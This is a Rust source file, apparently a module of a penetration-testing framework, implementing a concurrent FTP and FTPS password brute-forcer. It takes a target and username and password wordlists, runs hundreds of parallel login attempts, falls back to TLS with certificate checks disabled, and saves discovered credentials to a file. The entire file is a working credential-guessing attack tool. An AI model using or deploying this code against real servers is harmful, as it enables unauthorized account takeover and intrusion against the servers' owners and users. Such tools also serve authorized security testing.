use anyhow::{anyhow, Result};
use colored::*;
use suppaftp::tokio::{AsyncFtpStream, AsyncNativeTlsConnector, AsyncNativeTlsFtpStream};
use suppaftp::async_native_tls::TlsConnector;
use std::{
    fs::File,
    io::Write,
    sync::Arc,
    time::Duration,
};
use std::sync::atomic::{AtomicBool, Ordering};
use tokio::{
    sync::{Mutex, Semaphore},
    time::{sleep, timeout},
};
use futures::stream::{FuturesUnordered, StreamExt};

use crate::utils::{
    prompt_required, prompt_default, prompt_yes_no, 
    load_lines, get_filename_in_current_dir
};
use crate::modules::creds::utils::BruteforceStats;

const PROGRESS_INTERVAL_SECS: u64 = 2;
const DEFAULT_TIMEOUT_SECS: u64 = 10;

/// FTP error classification for better handling
#[derive(Debug, Clone, Copy)]
enum FtpErrorType {
    AuthenticationFailed,
    TlsRequired,
    ConnectionLimitExceeded,
    ConnectionFailed,
    Unknown,
}

impl FtpErrorType {
    /// Classify FTP error based on response message
    fn classify_error(msg: &str) -> Self {
        let msg_lower = msg.to_lowercase();

        // Authentication failed (wrong credentials)
        if msg.contains("530") || msg_lower.contains("login incorrect") ||
           msg_lower.contains("user") && msg_lower.contains("cannot") ||
           msg_lower.contains("password") && msg_lower.contains("incorrect") {
            return Self::AuthenticationFailed;
        }

        // TLS required
        if msg.contains("550 SSL") || msg_lower.contains("tls required") ||
           msg_lower.contains("ssl connection required") ||
           msg.contains("220 TLS go first") ||
           msg_lower.contains("must use tls") {
            return Self::TlsRequired;
        }

        // Connection limit exceeded
        if msg.contains("421") || msg_lower.contains("too many") ||
           msg_lower.contains("connection limit") {
            return Self::ConnectionLimitExceeded;
        }

        // Connection failed
        if msg_lower.contains("connection refused") ||
           msg_lower.contains("no route to host") ||
           msg_lower.contains("network unreachable") ||
           msg_lower.contains("connection reset") {
            return Self::ConnectionFailed;
        }

        Self::Unknown
    }
}

fn display_banner() {
    println!("{}", "╔═══════════════════════════════════════════════════════════╗".cyan());
    println!("{}", "║   FTP Brute Force Module                                  ║".cyan());
    println!("{}", "║   Supports FTP and FTPS (TLS) with IPv4/IPv6              ║".cyan());
    println!("{}", "╚═══════════════════════════════════════════════════════════╝".cyan());
    println!();
}

/// Format IPv4 or IPv6 addresses with port for display
fn format_addr_for_display(target: &str, port: u16) -> String {
    if target.starts_with('[') && target.contains("]:") {
        target.to_string()
    } else if target.matches(':').count() == 1 && !target.contains('[') {
        target.to_string()
    } else {
        let clean_target = if target.starts_with('[') && target.ends_with(']') {
            &target[1..target.len() - 1]
        } else {
            target
        };
        if clean_target.contains(':') {
            format!("[{}]:{}", clean_target, port)
        } else {
            format!("{}:{}", clean_target, port)
        }
    }
}


pub async fn run(target: &str) -> Result<()> {
    display_banner();
    println!("{}", format!("[*] Target: {}", target).cyan());

    let port: u16 = loop {
        let input = prompt_default("FTP Port", "21").await?;
        if let Ok(p) = input.parse() { break p }
        println!("Invalid port. Try again.");
    };
    let usernames_file = prompt_required("Username wordlist").await?;
    let passwords_file = prompt_required("Password wordlist").await?;
    let concurrency: usize = loop {
        let input = prompt_default("Max concurrent tasks", "500").await?;
        if let Ok(n) = input.parse::<usize>() {
            if n > 0 { break n }
        }
        println!("Invalid number. Try again.");
    };

    // Create a semaphore to limit concurrent network operations
    let semaphore = Arc::new(Semaphore::new(concurrency));

    let stop_on_success = prompt_yes_no("Stop on first success?", true).await?;
    let save_results = prompt_yes_no("Save results to file?", true).await?;
    let save_path = if save_results {
        Some(prompt_default("Output file", "ftp_results.txt").await?)
    } else {
        None
    };
    let verbose = prompt_yes_no("Verbose mode?", false).await?;
    let combo_mode = prompt_yes_no("Combination mode (user × pass)?", false).await?;

    let display_addr = format_addr_for_display(target, port);
    let connect_addr = format_addr_for_display(target, port);

    let found = Arc::new(Mutex::new(Vec::new()));
    let unknown = Arc::new(Mutex::new(Vec::<(String, String, String, String)>::new()));
    let stop = Arc::new(AtomicBool::new(false));
    let stats = Arc::new(BruteforceStats::new());

    println!("\n[*] Starting brute-force on {}", display_addr);

    let users = load_lines(&usernames_file)?;
    if users.is_empty() {
        println!("[!] Username wordlist is empty or invalid. Exiting.");
        return Ok(());
    }
    println!("{}", format!("[*] Loaded {} usernames", users.len()).cyan());

    let passes = load_lines(&passwords_file)?;
    if passes.is_empty() {
        println!("[!] Password wordlist is empty or invalid. Exiting.");
        return Ok(());
    }
    println!("{}", format!("[*] Loaded {} passwords", passes.len()).cyan());

    let total_attempts = if combo_mode { users.len() * passes.len() } else { passes.len() };
    println!("{}", format!("[*] Total attempts: {}", total_attempts).cyan());
    println!();

    // Start progress reporter
    let stats_clone = stats.clone();
    let stop_clone = stop.clone();
    let progress_handle = tokio::spawn(async move {
        loop {
            if stop_clone.load(Ordering::Relaxed) {
                break;
            }
            stats_clone.print_progress();
            sleep(Duration::from_secs(PROGRESS_INTERVAL_SECS)).await;
        }
    });

    let mut tasks = FuturesUnordered::new();

    if combo_mode {
        for user in &users {
            if stop_on_success && stop.load(Ordering::Relaxed) { break; }
            for pass in &passes {
                if stop_on_success && stop.load(Ordering::Relaxed) { break; }

                let addr_clone = connect_addr.clone();
                let target_clone = target.to_string();
                let display_addr_clone = display_addr.clone();
                let user_clone = user.clone();
                let pass_clone = pass.clone();
                let found_clone = Arc::clone(&found);
                let unknown_clone = Arc::clone(&unknown);
                let stop_clone = Arc::clone(&stop);
                let semaphore_clone = Arc::clone(&semaphore);
                let stats_clone = Arc::clone(&stats);
                let verbose_flag = verbose;
                let stop_on_success_flag = stop_on_success;

                tasks.push(tokio::spawn(async move {
                    if stop_on_success_flag && stop_clone.load(Ordering::Relaxed) {
                        return;
                    }
                    let permit = match semaphore_clone.acquire_owned().await {
                        Ok(permit) => permit,
                        Err(_) => return,
                    };
                    if stop_on_success_flag && stop_clone.load(Ordering::Relaxed) {
                        return;
                    }
                    match try_ftp_login(&addr_clone, &target_clone, &user_clone, &pass_clone, verbose_flag).await {
                        Ok(true) => {
                            println!("\r{}", format!("[+] {} -> {}:{}", display_addr_clone, user_clone, pass_clone).green().bold());
                            found_clone.lock().await.push((display_addr_clone.clone(), user_clone.clone(), pass_clone.clone()));
                            stats_clone.record_attempt(true, false);
                            if stop_on_success_flag {
                                stop_clone.store(true, Ordering::Relaxed);
                            }
                        }
                        Ok(false) => {
                            stats_clone.record_attempt(false, false);
                            if verbose_flag {
                                println!("\r{}", format!("[-] {} -> {}:{}", display_addr_clone, user_clone, pass_clone).dimmed());
                            }
                        }
                        Err(e) => {
                            stats_clone.record_attempt(false, true);
                            let msg = e.to_string();
                            {
                                let mut unk = unknown_clone.lock().await;
                                unk.push((
                                    display_addr_clone.clone(),
                                    user_clone.clone(),
                                    pass_clone.clone(),
                                    msg.clone(),
                                ));
                            }
                            if verbose_flag {
                                println!(
                                    "\r{}",
                                    format!(
                                        "[?] {} -> {}:{} error/unknown: {}",
                                        display_addr_clone, user_clone, pass_clone, msg
                                    )
                                    .yellow()
                                );
                            }
                        }
                    }
                    drop(permit);
                }));
            }
        }
    } else {
        if !users.is_empty() {
            for (i, pass) in passes.iter().enumerate() {
                if stop_on_success && stop.load(Ordering::Relaxed) { break; }
                let user = users.get(i % users.len()).expect("User list modulus logic error").clone();

                let addr_clone = connect_addr.clone();
                let target_clone = target.to_string();
                let display_addr_clone = display_addr.clone();
                let pass_clone = pass.clone();
                let found_clone = Arc::clone(&found);
                let unknown_clone = Arc::clone(&unknown);
                let stop_clone = Arc::clone(&stop);
                let semaphore_clone = Arc::clone(&semaphore);
                let stats_clone = Arc::clone(&stats);
                let verbose_flag = verbose;
                let stop_on_success_flag = stop_on_success;

                tasks.push(tokio::spawn(async move {
                    if stop_on_success_flag && stop_clone.load(Ordering::Relaxed) {
                        return;
                    }
                    let permit = match semaphore_clone.acquire_owned().await {
                        Ok(permit) => permit,
                        Err(_) => return,
                    };
                    if stop_on_success_flag && stop_clone.load(Ordering::Relaxed) {
                        return;
                    }
                    match try_ftp_login(&addr_clone, &target_clone, &user, &pass_clone, verbose_flag).await {
                        Ok(true) => {
                            println!("\r{}", format!("[+] {} -> {}:{}", display_addr_clone, user, pass_clone).green().bold());
                            found_clone.lock().await.push((display_addr_clone.clone(), user.clone(), pass_clone.clone()));
                            stats_clone.record_attempt(true, false);
                            if stop_on_success_flag {
                                stop_clone.store(true, Ordering::Relaxed);
                            }
                        }
                        Ok(false) => {
                            stats_clone.record_attempt(false, false);
                            if verbose_flag {
                                println!("\r{}", format!("[-] {} -> {}:{}", display_addr_clone, user, pass_clone).dimmed());
                            }
                        }
                        Err(e) => {
                            stats_clone.record_attempt(false, true);
                            let msg = e.to_string();
                            {
                                let mut unk = unknown_clone.lock().await;
                                unk.push((
                                    display_addr_clone.clone(),
                                    user.clone(),
                                    pass_clone.clone(),
                                    msg.clone(),
                                ));
                            }
                            if verbose_flag {
                                println!(
                                    "\r{}",
                                    format!(
                                        "[?] {} -> {}:{} error/unknown: {}",
                                        display_addr_clone, user, pass_clone, msg
                                    )
                                    .yellow()
                                );
                            }
                        }
                    }
                    drop(permit);
                }));
            }
        }
    }

    while let Some(res) = tasks.next().await {
        if let Err(e) = res {
            if verbose {
                println!("\r{}", format!("[!] Task error: {}", e).red());
            }
        }
    }

    // Stop progress reporter
    stop.store(true, Ordering::Relaxed);
    let _ = progress_handle.await;

    // Print final statistics
    stats.print_final().await;

    let creds = found.lock().await;
    if creds.is_empty() {
        println!("{}", "[-] No credentials found.".yellow());
    } else {
        println!("{}", format!("[+] Found {} valid credential(s):", creds.len()).green().bold());
        for (host, user, pass) in creds.iter() {
            println!("  {}  {} -> {}:{}", "✓".green(), host, user, pass);
        }
        if let Some(path) = save_path {
            let file_path = get_filename_in_current_dir(&path);
            match File::create(&file_path) {
                Ok(mut file) => {
                    for (host, user, pass) in creds.iter() {
                        if writeln!(file, "{} -> {}:{}", host, user, pass).is_err() {
                            eprintln!("[!] Error writing to result file '{}'", file_path.display());
                            break;
                        }
                    }
                    println!("[+] Results saved to '{}'", file_path.display());
                }
                Err(e) => {
                     eprintln!("[!] Could not create or write to result file '{}': {}", file_path.display(), e);
                }
            }
        }
    }

    drop(creds);

    // Unknown / errored attempts
    let unknown_guard = unknown.lock().await;
    if !unknown_guard.is_empty() {
        println!(
            "{}",
            format!(
                "[?] Collected {} unknown/errored FTP responses.",
                unknown_guard.len()
            )
            .yellow()
            .bold()
        );
        if prompt_yes_no("Save unknown responses to file?", true).await? {
            let default_name = "ftp_unknown_responses.txt";
            let prompt_msg = format!(
                "What should the unknown results be saved as? (default: {})",
                default_name
            );
            let fname = prompt_default(&prompt_msg, default_name).await?;
            let file_path = get_filename_in_current_dir(&fname);
            match File::create(&file_path) {
                Ok(mut file) => {
                    writeln!(
                        file,
                        "# FTP Bruteforce Unknown/Errored Responses (host,user,pass,error)"
                    )?;
                    for (host, user, pass, msg) in unknown_guard.iter() {
                        writeln!(file, "{} -> {}:{} - {}", host, user, pass, msg)?;
                    }
                    println!("[+] Unknown responses saved to '{}'", file_path.display());
                }
                Err(e) => {
                    eprintln!(
                        "[!] Could not create or write unknown response file '{}': {}",
                        file_path.display(),
                        e
                    );
                }
            }
        }
    }

    Ok(())
}

/// Try login using address string and fallback to FTPS if needed
async fn try_ftp_login(addr: &str, target: &str, user: &str, pass: &str, verbose: bool) -> Result<bool> {
    // Attempt 1: Plain FTP
    if verbose {
        println!("[i] Connecting to {} (plain FTP)", addr);
    }

    match timeout(Duration::from_secs(DEFAULT_TIMEOUT_SECS), AsyncFtpStream::connect(addr)).await {
        Ok(Ok(mut ftp)) => {
            match ftp.login(user, pass).await {
                Ok(_) => {
                    let _ = ftp.quit().await;
                    return Ok(true);
                }
                Err(e) => {
                    let msg = e.to_string();
                    match FtpErrorType::classify_error(&msg) {
                        FtpErrorType::AuthenticationFailed => {
                            return Ok(false);
                        }
                        FtpErrorType::TlsRequired => {
                            if verbose { println!("[i] {} - Plain FTP login indicated TLS required. Attempting FTPS...", addr); }
                        }
                        FtpErrorType::ConnectionLimitExceeded => {
                            println!("[-] {} - Server reported too many connections. Sleeping briefly...", addr);
                            sleep(Duration::from_secs(2)).await;
                            return Ok(false);
                        }
                        _ => {
                            if verbose {
                                println!("[!] FTP login error for {} ({}:{}): {} - Raw: {:?}", addr, user, pass, msg, e);
                            }
                            return Err(anyhow!("FTP login error: {}", msg));
                        }
                    }
                }
            }
        }
        Ok(Err(e)) => {
            let msg = e.to_string();
            match FtpErrorType::classify_error(&msg) {
                FtpErrorType::TlsRequired => {
                    if verbose { println!("[i] {} - Plain FTP connection indicated TLS required. Attempting FTPS...", addr); }
                }
                FtpErrorType::ConnectionLimitExceeded => {
                    println!("[-] {} - Server reported too many connections during connect. Sleeping briefly...", addr);
                    sleep(Duration::from_secs(2)).await;
                    return Ok(false);
                }
                FtpErrorType::ConnectionFailed => {
                    if verbose {
                        println!("[!] FTP connection failed to {} ({}:{}): {}", addr, user, pass, msg);
                    }
                    return Err(anyhow!("FTP connection failed: {}", msg));
                }
                _ => {
                    if verbose {
                        println!("[!] FTP connection error to {} ({}:{}): {} - Raw: {:?}", addr, user, pass, msg, e);
                    }
                    return Err(anyhow!("FTP connection error: {}", msg));
                }
            }
        }
        Err(_) => {
            if verbose {
                println!("[!] FTP connection timeout to {} ({}:{})", addr, user, pass);
            }
            return Err(anyhow!("FTP connection timeout"));
        }
    }

    // FTPS fallback: connect and upgrade to TLS
    if verbose {
        println!("[i] {} Attempting FTPS login for user '{}'", addr, user);
    }

    let mut ftp_tls = timeout(Duration::from_secs(DEFAULT_TIMEOUT_SECS), AsyncNativeTlsFtpStream::connect(addr))
        .await
        .map_err(|_| {
            if verbose {
                println!("[!] FTPS connection timeout to {} ({}:{})", addr, user, pass);
            }
            anyhow!("FTPS connection timeout")
        })?
        .map_err(|e| {
            if verbose {
                println!("[!] FTPS base connect failed for {} ({}:{}): {} - Raw: {:?}", addr, user, pass, e, e);
            }
            anyhow!("FTPS base connect failed: {}", e)
        })?;

    // Build a connector that accepts invalid certs/hostnames (as original code did)
    let connector = AsyncNativeTlsConnector::from(
        TlsConnector::new()
            .danger_accept_invalid_certs(true)
            .danger_accept_invalid_hostnames(true),
    );

    // Domain for TLS: extract clean hostname without brackets (IPv6) or port
    let domain = target
        .trim_start_matches('[')
        .split(&[']', ':'][..])
        .next()
        .unwrap_or(target);

    ftp_tls = ftp_tls
        .into_secure(connector, domain)
        .await
        .map_err(|e| {
            if verbose {
                println!("[!] TLS upgrade failed for {} ({}:{}): {} - Raw: {:?}", addr, user, pass, e, e);
            }
            anyhow!("TLS upgrade failed: {}", e)
        })?;

    match ftp_tls.login(user, pass).await {
        Ok(_) => {
            let _ = ftp_tls.quit().await;
            Ok(true)
        }
        Err(e) => {
            let msg = e.to_string();
            match FtpErrorType::classify_error(&msg) {
                FtpErrorType::AuthenticationFailed => Ok(false),
                _ => {
                    if verbose {
                        println!("[!] FTPS error for {} ({}:{}): {} - Raw: {:?}", addr, user, pass, msg, e);
                    }
                    Err(anyhow!("FTPS error: {}", msg))
                }
            }
        }
    }
}
